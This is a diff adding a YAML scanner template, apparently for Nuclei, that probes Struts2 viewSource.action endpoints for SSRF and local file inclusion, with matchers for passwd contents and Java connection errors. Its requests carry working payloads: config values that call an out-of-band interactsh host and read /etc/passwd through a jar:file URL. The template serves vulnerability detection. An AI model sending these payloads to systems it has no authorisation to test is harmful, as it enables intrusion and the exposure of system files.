@@ -1,0 +1,45 @@
+id: struts2-viewsource-config-ssrf-lfi-probe
+
+info:
+  name: Struts2 ViewSource config SSRF/LFI probe
+  author: pentest-platform
+  severity: medium
+  description: Detects suspicious behavior when ViewSourceAction-like endpoints consume user-controlled config URL/path.
+  tags: safe-poc,struts2,ssrf,lfi
+
+http:
+  - raw:
+      - |
+        GET /viewSource.action?config=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /viewSource.action?config=jar:file:/etc/passwd!/ HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /struts2-showcase/viewSource.action?config=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /struts2-showcase/viewSource.action?config=jar:file:/etc/passwd!/ HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:"
+          - "/bin/bash"
+      - type: word
+        part: body
+        words:
+          - "java.net.ConnectException"
+          - "java.net.UnknownHostException"
+      - type: word
+        part: body
+        words:
+          - "UnknownHostException"
+          - "MalformedURLException"
